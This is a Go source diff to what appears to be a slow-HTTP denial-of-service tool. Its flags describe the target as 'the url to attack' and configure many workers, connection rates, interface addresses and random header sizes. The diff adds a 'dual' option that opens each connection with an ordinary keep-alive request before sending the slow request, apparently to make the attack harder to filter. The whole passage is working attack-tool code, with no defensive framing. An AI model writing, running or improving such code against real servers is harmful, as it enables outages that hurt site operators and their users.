@@ -19,7 +19,7 @@ var Config struct {
 	URLString, Method, InterfacePrefix                           string
 	Addr                                                         *net.TCPAddr
 	Interval, NumWorkers, Connrate                               int
-	IsHTTPS                                                      bool
+	IsHTTPS, SendOpeningKeepAliveRequest                         bool
 	TLSConfig                                                    *tls.Config
 	MinKeyLength, MaxKeyLength, MinValueLength, MaxValueLength   int
 	URL                                                          *url.URL
@@ -34,6 +34,7 @@ var Stats struct {
 func init() {
     //We need rand to generate random HTTP header key-value pairs
 	rand.Seed(time.Now().UnixNano())
+	flag.BoolVar(&Config.SendOpeningKeepAliveRequest, "dual", false, "Send a normal request on each connection before the slow request")
 	flag.StringVar(&Config.InterfacePrefix, "iface", "", "Use all local addresses from this interface.")
 	flag.StringVar(&Config.URLString, "url", "http://localhost/", "The url to attack")
 	flag.StringVar(&Config.Method, "method", "GET", "The method of the HTTP request")
@@ -196,6 +197,20 @@ func RunConnection(localAddr *net.TCPAddr) {
     //Create a bufio.Writer for easy writing of strings.
 	writer := bufio.NewWriter(conn)
     
+	if Config.SendOpeningKeepAliveRequest {
+		_, err := writer.WriteString(Config.Method + " " + Config.URL.RequestURI() + " HTTP/1.1\r\n"+
+			"Host: " +  Config.URL.Host + "\r\n" +
+			"Connection: Keep-alive\r\n" +
+			"\r\n")
+		if err != nil {
+			return
+		}
+		err = writer.Flush()
+		if err != nil {
+			return
+		}
+	}
+
     //Send the HTTP header line.
 	_, err := writer.WriteString(Config.Method + " " + Config.URL.RequestURI() + " HTTP/1.1\r\n")
 	if err != nil {
